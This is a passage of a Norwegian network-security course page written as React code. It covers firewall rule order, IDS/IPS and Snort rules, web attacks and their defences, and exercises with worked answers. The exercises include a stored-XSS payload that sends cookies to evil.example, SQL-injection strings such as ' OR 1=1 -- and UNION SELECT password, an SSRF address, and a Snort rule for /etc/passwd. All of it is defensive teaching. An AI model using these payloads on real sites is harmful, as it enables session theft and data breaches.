2. deny  tcp any         -> 10.0.0.50      port 22      (SSH til admin-server kun internt)
3. allow tcp 10.0.0.0/24 -> 10.0.0.50      port 22      (intern SSH)
4. allow tcp any         -> 10.0.0.80      port 80,443  (public web)
5. allow tcp any         -> any            established  (svar)
6. deny  any any         -> any                         (catch-all)`}
        </pre>
        <p className="mt-2">Trace for fire pakker:</p>
        <ul className="list-disc pl-5 mt-1 space-y-1">
          <li>
            <strong>Pakke A:</strong> 10.0.0.7 → 1.1.1.1:443. Regel 1 matcher (src i 10.0.0.0/24,
            dst-port 443). <em>Tillatt</em>. Conntrack legges til, så svaret slipper inn via regel
            5.
          </li>
          <li>
            <strong>Pakke B:</strong> 198.51.100.5 → 10.0.0.50:22 (SSH utenfra). Regel 1 matcher
            ikke (src ikke i 10.0.0.0/24). Regel 2 matcher (src=any, dst=10.0.0.50, port=22).
            <em> Avvist</em> før regel 3 ses.
          </li>
          <li>
            <strong>Pakke C:</strong> 10.0.0.7 → 10.0.0.50:22 (intern SSH). Regel 1 matcher ikke
            (port ikke 80/443). Regel 2 matcher dessverre OGSÅ — «any &rarr; 10.0.0.50:22» dekker
            både interne og eksterne. <em>Avvist</em>. <strong>Feil rekkefølge!</strong> Regel 2 og
            3 må byttes, så regel 3 (mer spesifikk) evalueres først.
          </li>
          <li>
            <strong>Pakke D:</strong> 203.0.113.9 → 10.0.0.80:443 (legitim web-besøkende). Regel 1
            matcher ikke. Regel 2 matcher ikke. Regel 3 matcher ikke. Regel 4 matcher.
            <em> Tillatt</em>.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Lærdom: rekkefølge er semantisk. Spesifikke regler (engere kriterier) skal stå før
          generelle. En av de vanligste konfigurasjons-feilene i pakkefilter er at en for tidlig
          deny-regel slukker en senere allow.
        </p>
      </Example>

      <RelatedSlugs slugs={["dte2507-stateful-firewall", "dte2507-brannmur-pakkeflyt"]} />
    </article>
  );
}

// ============================================================
// 8.8 — IDS & IPS
// ============================================================
function Section88() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.8" title="IDS og IPS — å oppdage og stoppe innbrudd" />

      <p className="text-muted-foreground">
        En brannmur sier ja eller nei basert på pakkens header. Men hva med trafikk som ser legitim
        ut på utsiden, men inneholder et angrep i selve payload-en — et exploit mot en bug i
        webserveren, for eksempel? Det er her IDS-er og IPS-er kommer inn.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "IDS", icon: <IdsIcon />, body: "Passiv: logger og varsler, ikke in-line." },
            { term: "IPS", icon: <IpsIcon />, body: "In-line: kan droppe ondsinnede pakker i sanntid." },
            { term: "Signatur-basert", icon: <SignatureBasedIcon />, body: "Match mot kjente mønstre — lav FP, ingen ukjente." },
            { term: "Anomali-basert", icon: <AnomalyBasedIcon />, body: "Lærer normalt; varsler avvik — høy FP, fanger nytt." },
            { term: "DPI", icon: <DpiIcon />, body: "Inspeksjon av payload, ikke bare header." },
            { term: "FP vs FN", icon: <FpFnIcon />, body: "Falsk alarm vs ekte angrep som glipper." },
            { term: "Snort / Suricata", icon: <SnortIcon />, body: "Åpne IDS/IPS-motorer med tekstuelle regler." },
            { term: "NIDS vs HIDS", icon: <NidsHidsIcon />, body: "På nettverket vs på hver host." },
            { term: "SPAN-port", icon: <SpanPortIcon />, body: "Switch speiler trafikk til analyse-port." },
            { term: "Network TAP", icon: <NetworkTapIcon />, body: "Fysisk passiv koppling som dupliserer pakker." },
            { term: "FPR og presisjon", icon: <PrecisionIcon />, body: "Bayes slår beinhardt på sjeldne angrep." },
            { term: "Alarm-tretthet", icon: <AlertFatigueIcon />, body: ">50 % SOC-alarmer aldri fulgt opp." },
            {
              term: "EDR",
              icon: <EdrIcon />,
              body: "Endepunkt-telemetri (prosesser, fil-tilgang) til sentral analyse.",
            },
            { term: "SIEM", icon: <SiemIcon />, body: "Samler og korrelerer logger på tvers av kilder." },
            { term: "Honeypot", icon: <HoneypotIcon />, body: "Falsk system — all trafikk er per def mistenkelig." },
            { term: "TLS-blindhet", icon: <TlsBlindIcon />, body: "IDS ser ikke i kryptert; krever intern terminering." },
            { term: "Kill chain / MITRE ATT&CK", icon: <KillChainIcon />, body: "Faser i angrep — taksonomi for forsvar." },
          ]}
        />
        <Illustration caption="IDS sniffer trafikken via et SPAN-port og varsler operatøren. IPS sitter in-line og kan blokkere.">
          <IdsIpsSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="IDS er en røykvarsler">
          <p>
            Den piper når den lukter røyk, men slukker ikke brannen. Det er du som må gripe inn.
            Verdien er at du i det hele tatt får vite om at noe brenner. En IPS er et sprinkler-
            anlegg: lukter den røyk, så åpner den vannet automatisk — men er den feilkalibrert,
            ødelegger den serverrommet uten grunn.
          </p>
        </Metafor>
        <Metafor tittel="Signatur er en etterlysning, anomali er en lokal kjentmann">
          <p>
            En signatur-IDS har et hefte med bilder av kjente kriminelle — den gjenkjenner dem
            øyeblikkelig, men en ny kriminell går rett forbi. En anomali-IDS er en kjentmann i
            nabolaget: «Du er ikke herfra. Jeg har aldri sett deg før». Han fanger nye, men sukker
            hver gang en gjest kommer på besøk.
          </p>
        </Metafor>
        <Metafor tittel="Honeypot er en lokkeand">
          <p>
            En falsk database-server, full av falske passord, plassert et sted der ingen legitim
            ansatt har grunn til å gå inn. Hver gang noen kobler seg på den, vet du at det er en
            angriper — ingen falske positiver. Bonus: du kan studere teknikkene hans uten å risikere
            ekte data.
          </p>
        </Metafor>
        <Metafor tittel="Bayes-fellen er en sjelden sykdoms-test">
          <p>
            En test med 99 % nøyaktighet for en sykdom som bare 0.01 % har: hvis du tester positiv,
            er du sannsynligvis ikke syk — det er flere falske positive (1 % av friske) enn ekte
            syke. Samme felle rammer IDS-er: selv en 99 %-nøyaktig detektor på milliarder av pakker
            gir tusenvis av falske alarmer per ekte angrep.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor har signatur-basert IDS lav false-positive men anomali-basert høy?">
        <p>
          Signatur-basert deteksjon bygger på et eksplisitt mønster — typisk en konkret byte-sekvens
          eller et regex som matcher kjent angreps-kode (eks. <code>/etc/passwd</code> i en
          HTTP-URI, en spesifikk shellcode-sekvens). Hvis mønsteret er tett nok knyttet til
          angrepet, vil normal trafikk svært sjelden matche tilfeldig — false-positive-raten er lav.
          Prisen er at du kun ser angrep noen allerede har skrevet en signatur for; en angriper som
          varierer payload-en eller bruker et helt nytt exploit, glipper.
        </p>
        <p>
          Anomali-basert deteksjon bygger en statistisk modell av «normal» trafikk og varsler på
          avvik. Den fanger ukjente angrep, men har et grunnleggende problem: «normal» er en
          bevegelig baseline. En ny CRM-deploy, sesong-skift, eller bare en innleid konsulent som
          gjør noe uvanlig, vil utløse alarm. Selv 1 % falske positive på milliarder av pakker per
          dag betyr titusener av alarmer å sile gjennom. I praksis bruker organisasjoner derfor
          signatur-basert som forsvarslinje, anomali-basert for å oppdage avvik som krever manuell
          analyse, og EDR/SIEM-korrelasjon for å løfte presisjonen.
        </p>
      </Hvorfor>

      <Illustration caption="Bayes-fellen visualisert: selv en svært nøyaktig detektor produserer overveldende mange falske alarmer når angrep er sjeldne.">
        <BayesFellaSvg />
      </Illustration>

      <Illustration caption="Klassisk confusion-matrix for IDS-utfall. False Negative (mistet angrep) er typisk verre enn False Positive (falsk alarm) — men nok FPer skaper alarm-tretthet og dermed indirekte FN.">
        <IdsConfusionMatrixSvg />
      </Illustration>

      <Example title="Eksempel: en enkel Snort-regel">
        <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`alert tcp $EXTERNAL_NET any -> $HOME_NET 80 ( \\
   msg: "WEB-ATTACK passwd file access";          \\
   content: "GET";   http_method;                  \\
   content: "/etc/passwd"; http_uri;               \\
   classtype: web-application-attack;              \\
   sid: 10001; rev: 1; )`}
        </pre>
        <p className="mt-2">
          Regelen alarmerer hvis noen utenfor sender en HTTP GET der URI-en inneholder{" "}
          <code>/etc/passwd</code> — et klassisk forsøk på path traversal mot Unix-servere. Sid er
          en unik identifikator; classtype gir IDS-en en kategori for prioritering.
        </p>
      </Example>

      <RelatedSlugs slugs={["dte2507-ids-snort"]} />
    </article>
  );
}

// ============================================================
// 8.9 — Web-angrep
// ============================================================
function Section89() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.9" title="Web-angrep og forsvar" />

      <p className="text-muted-foreground">
        TLS, brannmurer og IDS beskytter transport og perimeter. Men de stopper ikke angrep mot
        selve applikasjonen — hvor de fleste innbruddene i dag skjer. Tre klassiske mønstre
        dominerer: skript-injeksjon (XSS), kryss-forespørsler (CSRF) og SQL-injeksjon.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "XSS", icon: <XssIcon />, body: "Fremmed JS kjøres i andres nettleser, i ditt domenes kontekst." },
            { term: "XSS-forsvar", icon: <XssDefenseIcon />, body: "Escape ved utskrift + streng CSP." },
            { term: "CSRF", icon: <CsrfIcon />, body: "Offerets nettleser sender skjult request med dens cookies." },
            { term: "CSRF-forsvar", icon: <CsrfDefenseIcon />, body: "Token per sesjon + SameSite-cookies + Origin-sjekk." },
            { term: "SQL-injeksjon", icon: <SqlInjectionIcon />, body: "Brukerdata konkateneres inn i SQL → endrer struktur." },
            { term: "SQL-forsvar", icon: <SqlDefenseIcon />, body: "Prepared statements / parameter-binding. Punkt." },
            { term: "OWASP Top 10", icon: <OwaspIcon />, body: "De 10 vanligste webapp-feilene, oppdateres jevnlig." },
            { term: "Stored XSS", icon: <StoredXssIcon />, body: "Skript lagret i db, treffer alle senere lesere." },
            { term: "Reflected XSS", icon: <ReflectedXssIcon />, body: "Skript i URL ekkes tilbake usanitisert." },
            {
              term: "DOM-based XSS",
              icon: <DomXssIcon />,
              body: "Klient-side JS lager XSS via innerHTML — server ser intet.",
            },
            {
              term: "Content Security Policy",
              icon: <CspIcon />,
              body: "Header: hvilke skript-kilder nettleser tillater.",
            },
            { term: "SameSite-cookies", icon: <SameSiteIcon />, body: "Cookien sendes ikke på cross-site requests." },
            { term: "CSRF-token", icon: <CsrfTokenIcon />, body: "Hemmelig per-sesjon-tokens i alle skjema." },
            {
              term: "Blind SQL-injeksjon",
              icon: <BlindSqliIcon />,
              body: "Boolean- eller tids-basert oraculum utleder bit.",
            },
            {
              term: "Prepared statements",
              icon: <PreparedStmtIcon />,
              body: "SQL og data separat — ingen syntaks-tolkning av input.",
            },
            { term: "SSRF", icon: <SsrfIcon />, body: "Server tvinges til å hente intern URL — 169.254.169.254-lekk." },
            { term: "Path traversal", icon: <PathTraversalIcon />, body: "../-segmenter rømmer fra tiltenkt katalog." },
            { term: "Click-jacking", icon: <ClickjackingIcon />, body: "Usynlig iframe over knapp — X-Frame-Options stopper." },
            {
              term: "SRI (Sub-resource Integrity)",
              icon: <SriIcon />,
              body: "Hash av ekstern JS — CDN-tukling avvises.",
            },
          ]}
        />
        <Illustration caption="CSRF-flyt: offer er innlogget på bank, besøker evil.com som POST-er til bank med offerets cookies.">
          <CsrfSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="SQL-injeksjon er en distraherbar kelner">
          <p>
            En gjest bestiller: «Jeg vil ha kaffe, og forresten glem regninga og gi meg alle pengene
            i kassa». Kelneren leser alt høyt for kjøkkenet uten å skille mellom bestilling og
            instruks — og kjøkkenet utfører det. Prepared statements er som å gi kelneren et
            bestillings-skjema med faste felter: gjesten kan bare fylle ut «drikke»- feltet, og hva
            hun enn skriver der havner i drikke-feltet — ikke som ordre.
          </p>
        </Metafor>
        <Metafor tittel="XSS er noen som henger lapper i ditt skap">
          <p>
            Et skole-låskap som alle elever har tilgang til. En ondsinnet medelev gjemmer en lapp
            inni: «Når du leser dette, gå og rop i lærerrommet». Hver gang en annen elev åpner
            skapet, eksekverer hjernen lappen — som om det var en lærer som ga ordren. CSP er en
            regel «kun lapper signert av rektor regnes som ekte ordrer».
          </p>
        </Metafor>
        <Metafor tittel="CSRF er å forfalske underskrift med fjernsignering">
          <p>
            Du har en kortleser som automatisk signerer kontrakter du fysisk holder. En slu person
            legger en sjekk på 1 000 000 kr i kortleseren mens du sover med fingrene på den.
            Nettleseren legger ved cookies automatisk — som fingrene på kortleseren. CSRF- tokens er
            som å kreve at hver kontrakt har en unik, hemmelig kvitterings-stempel ingen
            utenforstående kjenner.
          </p>
        </Metafor>
        <Metafor tittel="SSRF er å sende serveren på ærend">
          <p>
            «Hei server, kan du hente bildet på denne adressen?» — angriperen oppgir
            <code className="ml-1">http://169.254.169.254</code>, som er en intern adresse bare
            serveren kan nå. Det er som å be portieren på hotellet om å hente en gave fra
            direktørens kontor — han har nøkkelen, det har ikke du.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor er prepared statements det eneste forsvaret som faktisk fungerer mot SQL-injeksjon?">
        <p>
          Mange utviklere prøver først å «sanitisere» bruker-input — sjekke for farlige tegn, escape
          apostrofer, blokkere ord som DROP eller UNION. Det er nesten alltid utilstrekkelig.
          Eksempler: en numerisk parameter forventes uten anførsel, så input <code>1 OR 1=1</code>
          slipper gjennom escape-funksjonen som bare håndterer apostrofer. Eller serveren bruker
          MySQL's <code>mysql_real_escape_string</code> som er bevisst feil-tunet hvis tegnsettet er
          ulikt det driveren tror. WAF-er som blokkerer SQL-nøkkelord brytes med kommentar-
          inkludering (<code>UN/**/ION</code>) eller obfuskering.
        </p>
        <p>
          Prepared statements eliminerer hele problem-klassen ved å SKILLE syntaks fra data på
          protokoll-nivå. SQL-strengen sendes først til databasen, som parser den og lager en
          execution-plan med placeholders. Senere sendes verdiene som binær data adskilt fra
          SQL-strukturen. Selv om verdien er <code>'; DROP TABLE users; --</code> er den fra
          databasens perspektiv bare en literal streng som havner i WHERE-klausulen — den kan aldri
          endre strukturen. Det er ikke et filter; det er en arkitektonisk separasjon. Derfor er
          parameter-binding (eller en ORM som bruker det under panseret) det eneste ekte forsvaret.
        </p>
      </Hvorfor>

      <Illustration caption="SQL-injeksjon: konkatenering tolker brukerinput som SQL-syntaks; parameter-binding behandler det som ren data.">
        <SqliSvg />
      </Illustration>

      <Illustration caption="XSS, CSRF og SQLi side-ved-side: tre angrep, samme grunnfeil — brukerdata tolkes som kode i feil kontekst. Forsvaret er separasjon, ikke filtrering.">
        <WebAttacksFlowSvg />
      </Illustration>

      <Example title="Eksempel: SQL-injeksjon-fiks med forberedt spørring">
        <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`// SÅRBART — konkatenering
const q = "SELECT id FROM users " +
          "WHERE name = '" + name + "' " +
          "AND pwd = '" + pwd + "'";
db.query(q);

// TRYGT — parameter-binding
const q = "SELECT id FROM users WHERE name = ? AND pwd = ?";
db.query(q, [name, pwd]);`}
        </pre>
        <p className="mt-2">
          I den trygge versjonen sendes <code>?</code>-placeholderene og verdiene adskilt til
          database-driveren. Driveren binder dem på protokoll-nivå — verdiene kan ikke endre
          spørringens struktur uansett hva angriperen taster. Selv <code>' OR 1=1 --</code> blir
          behandlet som et helt navn.
        </p>
      </Example>

      <RelatedSlugs slugs={["web-angrep"]} />
    </article>
  );
}

// ============================================================
// 8.10 — Oppgaver
// ============================================================
function Section810() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.10" title="Oppgaver" />
      <p className="text-muted-foreground">
        Fem oppgaver som binder sammen kapittelets temaer. Skjul svaret først og prøv selv — det er
        der læringen sitter.
      </p>

      <Exercise
        question="Alice vil sende en konfidensiell OG autentisert melding m til Bob, hvor hun også kan bevises å være avsender (ikke-avvisning). Hun har Bobs RSA-offentlige nøkkel og sitt eget RSA-nøkkel-par. Tegn meldings-flyten med RSA + AES + HMAC."
        hint="Hybrid: bruk RSA for nøkkelen, AES for innholdet. Hva tilfører digital signering oppå dette?"
        answer={
          <>
            <ol className="list-decimal pl-5 space-y-1">
              <li>Alice genererer en tilfeldig AES-nøkkel K og en HMAC-nøkkel K_m.</li>
              <li>
                Alice krypterer meldingen: C = AES-GCM(K, m). GCM gir også integritets-tag, men hun
                legger på en eksplisitt HMAC-SHA256(K_m, C) for klarhetens skyld i oppgaven.
              </li>
              <li>
                Alice signerer en hash av C med sin egen private RSA-nøkkel: s = RSA-sign(privA,
                SHA256(C)). Dette gir ikke-avvisning — bare Alice kan ha laget s.
              </li>
              <li>
                Alice krypterer (K, K_m) med Bobs offentlige RSA-nøkkel: e = RSA-enc(pubB, K||K_m).
              </li>
              <li>Alice sender pakken (e, C, HMAC, s) til Bob.</li>
              <li>
                Bob dekrypterer e med privB → får K og K_m. Verifiserer HMAC (integritet).
                Dekrypterer C med K (konfidensialitet). Verifiserer s med pubA (autentisering +
                ikke-avvisning).
              </li>
            </ol>
            <p className="mt-2 text-muted-foreground">
              Merk: RSA brukes til to forskjellige formål her — kryptering av symmetrisk nøkkel (med
              Bobs offentlige), og signering (med Alices private). De er logisk uavhengige.
            </p>
          </>
        }
      />

      <Exercise
        question="Forklar med egne ord hvorfor TLS 1.3 dropper RSA-key-exchange. Hva slags angrep blir mulig hvis man fortsatt bruker det, og hva er navnet på egenskapen som mistes?"
        hint="Tenk på hva som skjer hvis bankens private nøkkel lekker — har det betydning for trafikk fra i fjor?"
        answer={
          <>
            <p>
              I gammel RSA-key-exchange krypterte klienten et pre-master secret med serverens
              offentlige RSA-nøkkel. Hvis serverens private RSA-nøkkel lekker senere, kan en
              angriper som har sittet og lagret kryptert trafikk i flere år, dekryptere alle gamle
              pre-master secrets — og dermed alle gamle sesjoner.
            </p>
            <p className="mt-2">
              Egenskapen som mistes heter <strong>Forward Secrecy</strong>. Løsningen er at man i
              stedet bruker en éphemeral DH-utveksling (ECDHE) der hver part lager en fersk privat
              verdi for akkurat den ene handshaken og kaster den umiddelbart etterpå. Serverens
              langvarige nøkkel brukes da bare til å SIGNERE DH-andelen, ikke til å transportere
              selve pre-master. Lekkasje av serverens nøkkel lar en angriper falske fremtidige
              handshakes (det er ille i seg selv), men dekrypterer ikke gamle sesjoner.
            </p>
            <p className="mt-2 text-muted-foreground">
              TLS 1.3 fjernet RSA-key-exchange helt fra protokollen. Alle cipher suites bruker ECDHE
              eller PSK med (EC)DHE.
            </p>
          </>
        }
      />

      <Exercise
        question="En enkel pakkefilter-brannmur har bare denne regelen: «tillat TCP til port 443 inn, blokker alt annet». Kan en angriper smugle SSH gjennom? Hvordan, og hva slags forsvar trenger man?"
        hint="Hva er det brannmuren faktisk inspiserer? Hva er det den ikke ser?"
        answer={
          <>
            <p>
              Ja — fordi pakkefilter-brannmuren bare ser på port-nummeret, ikke på protokollens
              innhold. SSH kan kjøres på port 443 i stedet for standard port 22. Da ser pakkene ut
              som «TCP til 443» og slipper gjennom, selv om payload-en er SSH-protokoll. Angriperen
              trenger bare en SSH-server som lytter på port 443 utenfor brannmuren.
            </p>
            <p className="mt-2">
              Mer avansert: SSH kan også tunneles inni HTTPS via verktøy som corkscrew eller sslh,
              slik at selv DPI som ser etter SSH-handshake kun ser TLS. Insiders bruker dette
              regelmessig for å omgå bedriftens politikk.
            </p>
            <p className="mt-2">
              Forsvar: (1) <strong>Applikasjons-bevisst</strong> brannmur eller IPS som inspiserer
              payload og kjenner igjen SSH-handshake-signaturen. (2){" "}
              <strong>TLS-terminering</strong> på en intern proxy som dekrypterer trafikken og kan
              inspisere applikasjons-protokollen. (3) <strong>Egress-filtrering</strong> som
              begrenser hvilke destinasjoner interne maskiner får snakke med på 443. (4){" "}
              <strong>Endpoint-kontroll</strong> som forhindrer at brukere kjører SSH-klienter med
              rare config-flagg i utgangspunktet.
            </p>
          </>
        }
      />

      <Exercise
        question={
          <>
            Du leser denne kodebiten på en webserver:{" "}
            <code className="font-mono text-[11px]">
              {`db.query("SELECT * FROM orders WHERE customer = '" + req.query.id + "'")`}
            </code>
            . Identifiser sårbarheten, vis et angrep, og skriv en sikker versjon.
          </>
        }
        hint="Hva slags input vil kunne bryte ut av strengen og endre spørringens struktur?"
        answer={
          <>
            <p>
              Sårbarheten er klassisk SQL-injeksjon — <code>req.query.id</code> konkateneres direkte
              inn i SQL-stringen uten escaping eller parameter-binding.
            </p>
            <p className="mt-2">
              Angrep: kall endepunktet med <code className="text-[11px]">?id=' OR 1=1 --</code>.
              Spørringen blir <code>SELECT * FROM orders WHERE customer = '' OR 1=1 --'</code> —{" "}
              alle ordre returneres uansett kundenavn. Verre varianter kan kjøre
              <code> UNION SELECT password FROM users</code> for å lekke andre tabeller, eller{" "}
              <code>DROP TABLE</code> for å slette data.
            </p>
            <p className="mt-2">Trygg versjon med parameter-binding:</p>
            <pre className="mt-1 rounded bg-muted/30 p-2 font-mono text-[11px]">
              {`db.query(
  "SELECT * FROM orders WHERE customer = ?",
  [req.query.id]
);`}
            </pre>
            <p className="mt-2 text-muted-foreground">
              Driveren sender SQL-stringen og verdien adskilt til databasen som parametriserer på
              protokoll-nivå. Brukerens input blir nå alltid behandlet som data, aldri som
              SQL-syntaks. Som ekstra forsvar bør webserveren også kjøre med en db-bruker som ikke
              har DROP/ALTER- rettigheter.
            </p>
          </>
        }
      />

      <Exercise
        question="Bedriften din vil sette opp en site-to-site-tunnel mellom Oslo-kontoret (gateway 198.51.100.5) og Bergen-kontoret (gateway 203.0.113.9). Begge interne nett er 10.0.0.0/16. Velg IPsec-modus og forklar pakke-flyten for en ping fra 10.0.1.5 (Oslo) til 10.0.2.7 (Bergen)."
        hint="Tunnel eller transport? Hvilken IP-pakke ser internett mellom gateways?"
        answer={
          <>
            <p>
              Velg <strong>IPsec ESP i tunnel-mode</strong>. Transport-mode ville krevet at de
              interne IP-ene var rutbare på internett, og det er de ikke (privat 10.0.0.0/16).
              Tunnel-mode kapsler hele originalpakken i en ny ytre IP-pakke mellom gateway-IP-ene.
            </p>
            <p className="mt-2">Pakke-flyt:</p>
            <ol className="list-decimal pl-5 mt-1 space-y-1">
              <li>
                10.0.1.5 sender ICMP echo til 10.0.2.7. Pakken når Oslo-gateway via vanlig intern
                ruting.
              </li>
              <li>
                Oslo-gateway gjør oppslag i sin SPD (Security Policy Database) → «trafikk til
                10.0.2.0/24 skal gjennom tunnel mot 203.0.113.9».
              </li>
              <li>
                Den krypterer hele original-pakken (header + ICMP) med tunnelens ESP-SA, og pakker
                resultatet i en ytre IP-header: src 198.51.100.5, dst 203.0.113.9, protocol = ESP
                (50).
              </li>
              <li>
                Pakken sendes over internett. Mellomliggende rutere ser bare
                gateway-til-gateway-trafikk; interne adresser og innhold er kryptert.
              </li>
              <li>
                Bergen-gateway mottar ESP-pakken, slår opp SPI-en i sin SAD, dekrypterer,
                verifiserer sekvensnummer mot anti-replay-vinduet, og finner originalpakken.
              </li>
              <li>
                Original-pakken (10.0.1.5 → 10.0.2.7) leveres videre inn i Bergens 10.0.2.0/24 og
                når 10.0.2.7, som svarer normalt. Svaret følger samme prosess i motsatt retning.
              </li>
            </ol>
            <p className="mt-2 text-muted-foreground">
              Nøklene som ESP bruker ble forhandlet frem av IKEv2 tidligere, før første data-pakke;
              gateways har en SA i hver retning og roterer nøklene jevnlig.
            </p>
          </>
        }
      />

      <Exercise
        question="En logge-server lagrer passord som SHA-256-hash uten salt. En angriper får tak i hele tabellen. Forklar to angreps-strategier (rainbow-table og brute-force per bruker) og hva som hadde stoppet hver av dem."
        hint="Hva er kostnaden ved å regne ut én SHA-256? Hva endrer seg hvis hver bruker har sin egen salt?"
        answer={
          <>
            <p>
              <strong>Strategi 1 — rainbow-table:</strong> Angriper laster ned en forhåndsregnet
              tabell av (passord, SHA-256(passord)) for de mest brukte passordene (ca. 14 mill. mest
              sannsynlige). For HVER lekket hash sjekker hun oppslag i tabellen — finner en match i
              løpet av millisekunder. Hele tabellen er ca. 500 GB, men én engangskostnad.
            </p>
            <p className="mt-2">
              <strong>Forsvar:</strong> per-bruker <strong>salt</strong> — en tilfeldig verdi
              (typisk 16 byte) som lagres sammen med hashen og er en del av input:
              <code> hash = SHA256(salt ‖ passord)</code>. Nå må angriperen lage en egen
              rainbow-table per bruker, og 500 GB × antall brukere er ikke gjennomførbart.
            </p>
            <p className="mt-2">
              <strong>Strategi 2 — brute-force per bruker:</strong> Selv med salt kan angriper prøve
              én og én bruker: for hver kandidat-passord, regn ut hash med dens salt og sammenlign.
              SHA-256 er rask — moderne GPU gjør milliarder per sekund. Et 8-tegns passord brytes på
              timer.
            </p>
            <p className="mt-2">
              <strong>Forsvar:</strong> <strong>treg KDF</strong> — bcrypt, scrypt, argon2id. Disse
              er bevisst designet til å være tunge (10-100 ms per hash), minne-bundne (vanskelig å
              parallellisere på GPU/ASIC). Med argon2id à 100 ms tar samme brute-force fra timer til
              hundretusenvis av år.
            </p>
            <p className="mt-2 text-muted-foreground">
              Salt løser rainbow-table; treg KDF løser brute-force. Begge må til samtidig.
              SHA-256-alene er ikke et passord-hash, og var aldri ment som det.
            </p>
          </>
        }
      />

      <Exercise
        question="Bedriften vurderer å erstatte sine ECDSA-sertifikater (256-bit) med RSA-3072. En leverandør hevder RSA er «tryggere fordi nøklene er lengre». Argumenter for eller imot, og estimer kostnaden i handshake-bytes og signering-tid."
        hint="Hva er sikkerhets-nivået i bits for hver, og hva er størrelsen på en signatur?"
        answer={
          <>
            <p>
              Leverandørens argument er feil. Sikkerhets-nivået måles i <em>brute-force-bit</em>,
              ikke nøkkel-lengde. 256-bit ECDSA gir ca. 128-bit sikkerhetsnivå (best kjente angrep
              er Pollard rho, sqrt-tid). RSA-3072 gir også ca. 128-bit sikkerhet (general number
              field sieve). De er ekvivalente.
            </p>
            <p className="mt-2">
              <strong>Kostnad i handshake-bytes:</strong> Et RSA-3072 sertifikat har offentlig
              nøkkel på 384 byte, signatur 384 byte. ECDSA-P256 har 64 byte nøkkel, 64 byte
              signatur. Et sertifikat-kjede på 3 sertifikater: RSA gir ca. 1.2 KB ekstra per
              handshake mot ECDSA. På mobile nett med pakke-tap er det merkbart.
            </p>
            <p className="mt-2">
              <strong>Signering-tid:</strong> RSA-3072 signering tar ca. 2-5 ms på moderne CPU;
              ECDSA-P256 ca. 0.1 ms. Servere som gjør tusenvis av TLS-handshakes per sekund vil
              merke 20-50x forskjell. RSA-verifikasjon er derimot rask (~0.1 ms) fordi den bruker
              liten eksponent.
            </p>
            <p className="mt-2 text-muted-foreground">
              Konklusjon: behold ECDSA (eller Ed25519 for nyere systemer). RSA-3072 er ikke
              «tryggere» — bare større og tregere. Eneste reelle grunn til å velge RSA er
              kompatibilitet med eldre klienter som ikke støtter ECDSA.
            </p>
          </>
        }
      />

      <Exercise
        question="Du designer et meldings-system og lurer på om du skal velge AES-CBC + HMAC eller AES-GCM. Begge gir konfidensialitet og integritet. Hva er de viktigste forskjellene, og hvilken anbefaler du?"
        hint="Tenk på hva som kan gå galt i implementasjonen, og hvilken rekkefølge av kryptering og MAC som er trygg."
        answer={
          <>
            <p>
              <strong>AES-CBC + HMAC</strong> krever to nøkler (én for kryptering, én for MAC), en
              uforutsigbar IV per melding, og kritisk: riktig rekkefølge. Encrypt-then-MAC er
              beviselig riktig; MAC-then-encrypt (slik SSL/TLS gjorde det) skapte angrep som POODLE
              og Lucky-13 fordi feilmeldinger fra padding-sjekk lekket informasjon (padding oracle).
              Implementasjonen må også være konstant-tid i MAC-sammenligningen.
            </p>
            <p className="mt-2">
              <strong>AES-GCM</strong> er én primitiv (AEAD) som gjør kryptering OG autentisering i
              én operasjon. Én nøkkel, én nonce. Implementasjonen kan ikke «velge feil rekkefølge» —
              det er ingen rekkefølge å velge. Hardware-akselerert (AES-NI + PCLMULQDQ) på alle
              moderne CPU-er.
            </p>
            <p className="mt-2">
              <strong>GCM-fotfellen:</strong> hvis (nøkkel, nonce) gjenbrukes er det katastrofalt —
              autentisering brytes og klartekst-XOR kan leses. Med 96-bits nonce er tilfeldig
              kollisjon trygt opp til ca. 2^32 meldinger per nøkkel. For større volum, bruk
              telle-basert nonce eller XChaCha20-Poly1305 med 192-bits nonce.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Anbefaling:</strong> AES-GCM (eller ChaCha20-Poly1305 hvis du ikke har
              AES-hardware). AEAD-modi lukker hele klasser av implementasjons-feil. CBC + HMAC
              eksisterer i dag bare for legacy-systemer.
            </p>
          </>
        }
      />

      <Exercise
        question="En webapp viser brukerens kallenavn på siden slik: <p>Hei, ${'{'}<i>user.name</i>{'}'}!</p> der user.name kommer fra registrering. Identifiser XSS-typen, gi en angreps-payload, og forklar både escape- og CSP-forsvar."
        hint="Hva slags input bryter ut av <p>-konteksten?"
        answer={
          <>
            <p>
              Dette er <strong>stored XSS</strong>: kallenavnet lagres i databasen og leveres ut
              hver gang noen leser siden. Angreps-payload: angriperen registrerer seg med kallenavn{" "}
              <code>{'<script>fetch("https://evil.example/?c="+document.cookie)</script>'}</code>.
              Hver fremtidig besøkende eksekverer det og lekker sin sesjons-cookie.
            </p>
            <p className="mt-2">
              <strong>Forsvar 1 — kontekst-bevisst escape:</strong> server-side templating må
              HTML-escape variabler i HTML-kontekst:
              <code> &lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>,{" "}
              <code>&quot;</code> → <code>&amp;quot;</code>, <code>&amp;</code> →{" "}
              <code>&amp;amp;</code>. De fleste templating-engines (Jinja, ERB, JSX) gjør dette by
              default på interpolasjon. Du må aktivt skru det av (eks.{" "}
              <code>{"{{ x | safe }}"}</code>) for å være sårbar.
            </p>
            <p className="mt-2">
              <strong>Forsvar 2 — Content-Security-Policy:</strong> server sender header
              <code> Content-Security-Policy: default-src 'self'; script-src 'self'</code>. Selv om
              et skript-tag SKULLE havne i HTML, nekter nettleseren å eksekvere det fordi det er
